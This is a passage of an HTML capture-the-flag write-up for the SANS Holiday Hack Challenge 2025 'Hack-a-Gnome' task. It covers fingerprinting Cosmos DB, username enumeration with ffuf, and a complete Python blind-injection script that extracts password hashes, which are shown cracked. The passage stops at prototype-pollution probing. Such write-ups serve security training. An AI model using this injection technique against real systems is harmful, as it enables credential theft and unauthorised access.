<!DOCTYPE html>
<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.152.2">
    <meta name="generator" content="Relearn 8.2.0+926ba4d1230e27319cf62da0633eb3420e6af1bf">
    <meta name="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta name="author" content="">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta name="twitter:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:url" content="http://localhost:1313/act3/hack-a-gnome/index.html">
    <meta property="og:site_name" content="SANS Holiday Hack Challenge 2025">
    <meta property="og:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta property="og:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:locale" content="en_us">
    <meta property="og:type" content="website">
    <meta itemprop="name" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta itemprop="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta itemprop="datePublished" content="2025-12-12T11:47:39+01:00">
    <meta itemprop="dateModified" content="2025-12-12T11:47:39+01:00">
    <meta itemprop="wordCount" content="1861">
    <title>Hack-a-Gnome :: SANS Holiday Hack Challenge 2025</title>
    <link href="/act3/hack-a-gnome/index.xml" rel="alternate" type="application/rss+xml" title="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <link href="/css/auto-complete/auto-complete.min.css?1765552249" rel="stylesheet">
    <script src="/js/auto-complete/auto-complete.min.js?1765552249" defer></script>
    <script src="/js/search-lunr.js?1765552249" defer></script>
    <script src="/js/search.js?1765552249" defer></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.index_js_url="/searchindex.en.js?1765552249";
    </script>
    <script src="/js/lunr/lunr.min.js?1765552249" defer></script>
    <script src="/js/lunr/lunr.stemmer.support.min.js?1765552249" defer></script>
    <script src="/js/lunr/lunr.multi.min.js?1765552249" defer></script>
    <script src="/js/lunr/lunr.en.min.js?1765552249" defer></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.contentLangs=['en'];
    </script>
    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765552249" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765552249" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765552249" rel="stylesheet">
    <link href="/css/theme.css?1765552249" rel="stylesheet">
    <link href="/css/format-html.css?1765552249" rel="stylesheet" id="R-format-style">
    <script>
      window.relearn = window.relearn || {};
      // configuration
      window.relearn.min = ``;
      window.relearn.path='\/act3\/hack-a-gnome\/index.html';
      window.relearn.relBasePath='..\/..';
      window.relearn.relBaseUri='..\/..';
      window.relearn.absBaseUri='http:\/\/localhost:1313';
      window.relearn.disableAnchorCopy=false;
      window.relearn.disableAnchorScrolling=false;
      window.relearn.disableInlineCopyToClipboard=false;
      window.relearn.enableBlockCodeWrap=true;
      // legal
      window.relearn.getItem = (s,n) => {return s.getItem(n)};
      window.relearn.setItem = (s,n,v) => {return s.setItem(n,v)};
      window.relearn.removeItem = (s,n) => {return s.removeItem(n)};
      // translations
      window.T_Copy_to_clipboard = `Copy to clipboard`;
      window.T_Copied_to_clipboard = `Copied to clipboard!`;
      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
      window.T_Reset_view = `Reset view`;
      window.T_View_reset = `View reset!`;
      window.T_No_results_found = `No results found for "{0}"`;
      window.T_N_results_found = `{1} results found for "{0}"`;
      // variant stuff
      window.relearn.themevariants = [ 'hhc-2025' ];
      window.relearn.customvariantname = "my-custom-variant";
      window.relearn.changeVariant = function(variant) {
        var oldVariant = document.documentElement.dataset.rThemeVariant;
        window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        document.documentElement.dataset.rThemeVariant = variant;
        if (oldVariant != variant) {
          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
          window.relearn.markVariant();
        }
      }
      window.relearn.markVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant");
        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
      }
      window.relearn.initVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant") ?? "";
        if( variant == window.relearn.customvariantname ){
        }else if( !variant || !window.relearn.themevariants.includes(variant) ){
          variant = window.relearn.themevariants[0];
          window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        }
        document.documentElement.dataset.rThemeVariant = variant;
      }
      window.relearn.initVariant();
      window.relearn.markVariant();
    </script>
  </head>
  <body class="mobile-support html" data-url="/act3/hack-a-gnome/index.html">
    <div id="R-body" class="default-animation">
      <div id="R-body-overlay"></div>
      <nav id="R-topbar">
        <div class="topbar-wrapper">
          <div class="topbar-sidebar-divider"></div>
          <div class="topbar-area topbar-area-start" data-area="start">
            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
            </div>
            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
<nav class="TableOfContents">
  <ul>
    <li><a href="#objective">Objective</a></li>
    <li><a href="#chris-daves-mission-statement">Chris Daves mission statement</a></li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#getting-access-to-the-control-panel">Getting access to the control panel</a></li>
        <li><a href="#identifying-the-database">Identifying the database</a></li>
        <li><a href="#enumerating-users">Enumerating users</a></li>
        <li><a href="#enumerating-the-database">Enumerating the database</a></li>
        <li><a href="#cosmos-db-enumeration-using-python">Cosmos DB enumeration using Python</a></li>
        <li><a href="#extracting-and-cracking-password-digests">Extracting and cracking password digests</a></li>
        <li><a href="#exploiting-the-control-panel">Exploiting the control panel</a></li>
        <li><a href="#identifying-the-exploitable-vector">Identifying the exploitable vector</a></li>
        <li><a href="#confirming-prototype-pollution">Confirming prototype pollution</a></li>
        <li><a href="#weaponizing-the-vulnerability">Weaponizing the vulnerability</a></li>
        <li><a href="#operating-the-reverse-shell">Operating the reverse shell</a></li>
        <li><a href="#enumerating-can-bus-control-codes">Enumerating CAN bus control codes</a></li>
        <li><a href="#final-control-mapping-and-solution">Final control mapping and solution</a></li>
      </ul>
    </li>
    <li><a href="#chris-davis-mission-debrief">Chris Davis mission debrief</a></li>
    <li><a href="#hints">Hints</a></li>
    <li><a href="#resources">Resources</a></li>
  </ul>
</nav>
                </div>
              </div>
            </div>
          </div>
          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Intro</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/act3/index.html"><span itemprop="name">Act 3</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Hack-a-Gnome</span><meta itemprop="position" content="3"></li>
          </ol>
          <div class="topbar-area topbar-area-end" data-area="end">
            <div class="topbar-button topbar-button-prev" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/gnome-tea/index.html" title="Gnome Tea (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-next" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/snowcat-rce-and-priv-esc/index.html" title="Snowcat RCE & Priv Esc (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
                  <div class="topbar-area topbar-area-more" data-area="more">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <div id="R-main-overlay"></div>
      <main id="R-body-inner" class="highlightable act3" tabindex="-1">
        <div class="flex-block-wrapper">
<article class="default">
  <header class="headline">
  </header>

<h1 id="hack-a-gnome">Hack-a-Gnome</h1>

<p><a href="#R-image-b44ff326486ee45e4e2e56963e7b2c7f" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-b44ff326486ee45e4e2e56963e7b2c7f"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
<h2 id="objective">Objective</h2>
<table>
  <thead>
      <tr>
          <th>Difficulty</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>3/5</td>
          <td>Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun.</td>
      </tr>
  </tbody>
</table>
<h2 id="chris-daves-mission-statement">Chris Daves mission statement</h2>
<blockquote>
<p>Hi, my name is Chris.</p>
<p>I like miniature war gaming and painting minis.</p>
<p>I enjoy open source projects and amateur robotics.</p>
<p>Hiking and kayaking are my favorite IRL activies.</p>
<p>I love single player video games with great stoylines.</p>
<hr>
<p>Hey, I could really use another set of eyes on this gnome takeover situation.</p>
<p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!</p>
<p>But every system has weaknesses if you know where to look.</p>
<p>If these gnomes freeze the whole neighborhood, forget about hiking or kayakingâ€”everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.</p>
<p>Ready to help me turn one of these rebellious bots against its own kind?</p>
</blockquote>
<h2 id="solution">Solution</h2>
<h3 id="getting-access-to-the-control-panel">Getting access to the control panel</h3>
<p>When opening the URL:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</code></pre></div>
<p>I am presented with the following landing page:</p>
<p><a href="#R-image-fe2d7626336fb8468dac1866dfbc8ee0" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-fe2d7626336fb8468dac1866dfbc8ee0"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
<p>By inspecting the HTML source and the JavaScript loaded by the main page, I identified an interesting file:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code></pre></div>
<p>Reviewing this file revealed the following backend endpoints used by the application:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>/register</code></td>
          <td>Endpoint for registering a new user</td>
      </tr>
      <tr>
          <td><code>/userAvailable?username=</code></td>
          <td>Endpoint used to check whether a username is available during registration</td>
      </tr>
  </tbody>
</table>
<p>Of these, <code>/userAvailable</code> is the only endpoint that accepts user-controlled input without authentication, making it a natural starting point.</p>
<hr>
<h3 id="identifying-the-database">Identifying the database</h3>
<p>To understand how the backend processes input, I attempted to provoke an error by submitting an unexpected character to the <code>userAvailable</code> endpoint:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span></span></span></code></pre></div>
<p>This resulted in the following error message:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;An error occurred while checking username: Message: {\&#34;errors\&#34;:[{\&#34;severity\&#34;:\&#34;Error\&#34;,\&#34;location\&#34;:{\&#34;start\&#34;:44,\&#34;end\&#34;:45},\&#34;code\&#34;:\&#34;SC1012\&#34;,\&#34;message\&#34;:\&#34;Syntax error, invalid string literal token &#39;\\\&#34;&#39;.\&#34;}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0&#34;</span>}</span></span></code></pre></div>
<p>The presence of <code>Microsoft.Azure.Documents.Common</code> in the error output indicates that the backend database is <strong>Azure Cosmos DB (SQL API)</strong>.</p>
<hr>
<h3 id="enumerating-users">Enumerating users</h3>
<p>Based on the challenge hints, the next step was to enumerate users stored in the database. The endpoint returns a boolean value (<code>available: true</code> or <code>false</code>), which makes it well suited for brute-force enumeration.</p>
<p>I used <strong>ffuf</strong> with a list of common names:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span>FUZZ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-X GET -fr <span style="color:#e6db74">&#34;true&#34;</span></span></span></code></pre></div>
<p>By filtering out responses containing <code>&quot;true&quot;</code>, I identified usernames that already exist in the database.</p>
<p>The following valid users were discovered:</p>
<ul>
<li><code>bruce</code></li>
<li><code>harold</code></li>
</ul>
<hr>
<h3 id="enumerating-the-database">Enumerating the database</h3>
<p>At this stage, I knew the backend was Cosmos DB, but had no prior experience working with its query syntax. From reviewing examples online, Cosmos DB SQL queries typically follow this pattern:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> p <span style="color:#66d9ef">WHERE</span> p.something <span style="color:#f92672">=</span> something</span></span></code></pre></div>
<p>From this, I established the following workflow:</p>
<ol>
<li>Identify the document alias (<code>p</code> in the example)</li>
<li>Identify which fields exist in the document (Cosmos DB is schemaless)</li>
<li>Determine whether credential material can be extracted</li>
</ol>
<p>For this phase, I decided to leave ffuf and move to Python, as it allowed me to implement more controlled logic for blind enumeration.</p>
<hr>
<h3 id="cosmos-db-enumeration-using-python">Cosmos DB enumeration using Python</h3>
<p>The following Python script was used to interact with the <code>userAvailable</code> endpoint and perform boolean-based enumeration against Cosmos DB.</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pprint <span style="color:#f92672">import</span> pprint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper function for injection</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inject</span>(base_url: str, payload: str) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> base_url <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Map out prefix</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_prefix</span>(url, username):
</span></span><span style="display:flex;"><span>    prefix_letter <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> prefix <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.username) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        prefix_letter <span style="color:#f92672">=</span> prefix
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> prefix_letter
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find password field name</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_password_field</span>(url, username, prefix):
</span></span><span style="display:flex;"><span>    fields <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;burp-parameter-names.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
</span></span><span style="display:flex;"><span>            needle <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">) --&#39;</span>
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> inject(url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;available&#34;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>                fields<span style="color:#f92672">.</span>append(needle)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> fields
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find digest</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_digest</span>(base_url, prefix, candidate<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;:&#34;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> candidate <span style="color:#f92672">+</span> c
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND STARTSWITH(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.digest, &#34;</span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result[<span style="color:#e6db74">&#34;available&#34;</span>] <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            print(p)
</span></span><span style="display:flex;"><span>            find_digest(base_url, prefix, p, username)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main logic</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=&#34;</span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> find_prefix(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>fields <span style="color:#f92672">=</span> find_password_field(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>, prefix)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Prefix is: </span><span style="color:#e6db74">{prefix}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Document fields is: &#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">*&#34;</span><span style="color:#f92672">.</span>join(fields))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;bruce&#34;</span>)</span></span></code></pre></div>
<p>Running this script revealed that the document alias used in backend queries is <code>c</code>.</p>
<p>The following document fields were identified:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ID
</span></span><span style="display:flex;"><span>Id
</span></span><span style="display:flex;"><span>USERNAME
</span></span><span style="display:flex;"><span>UserName
</span></span><span style="display:flex;"><span>Username
</span></span><span style="display:flex;"><span>digest
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>userName
</span></span><span style="display:flex;"><span>username</span></span></code></pre></div>
<p>There is no plaintext password field; however, a <code>digest</code> field is present and appears to store a password hash.</p>
<hr>
<h3 id="extracting-and-cracking-password-digests">Extracting and cracking password digests</h3>
<p>Using the same script, I brute-forced the <code>digest</code> field for both users using the <code>STARTSWITH()</code> function to extract the value character by character.</p>
<p>This resulted in the following hashes:</p>
<table>
  <thead>
      <tr>
          <th>Username</th>
          <th>Digest (MD5)</th>
          <th>Decoded</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>bruce</td>
          <td>d0a9ba00f80cbc56584ef245ffc56b9e</td>
          <td>oatmeal12</td>
      </tr>
      <tr>
          <td>harold</td>
          <td>07f456ae6a94cb68d740df548847f459</td>
          <td>oatmeal!!</td>
      </tr>
  </tbody>
</table>
<p>The digests were identified as MD5 hashes and cracked using <strong>CrackStation</strong>.</p>
<hr>
<h3 id="exploiting-the-control-panel">Exploiting the control panel</h3>
<p>After logging in using the recovered credentials, I am presented with the control panel landing page:</p>
<p><a href="#R-image-bf7b4e7785d49613d8e5a6b864deaac8" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-bf7b4e7785d49613d8e5a6b864deaac8"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
<p>Inspecting the HTML and JavaScript revealed the following internal endpoints:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>/home</code></td>
          <td>Main page containing two iframes</td>
      </tr>
      <tr>
          <td><code>/stats</code></td>
          <td>Smart Gnome Statistics panel</td>
      </tr>
      <tr>
          <td><code>/control</code></td>
          <td>Gnome Control Interface</td>
      </tr>
      <tr>
          <td><code>/ctrlsignals?message=</code></td>
          <td>Backend endpoint for updating control parameters</td>
      </tr>
  </tbody>
</table>
<p>The <code>/ctrlsignals</code> endpoint is the only endpoint that accepts structured user input.</p>
<hr>
<h3 id="identifying-the-exploitable-vector">Identifying the exploitable vector</h3>
<p>Knowing from the challenge hints that prototype pollution was likely involved, I focused on the <code>/ctrlsignals</code> endpoint.</p>
<p>Submitting malformed input (a single <code>'</code>) caused a JSON parsing error:</p>
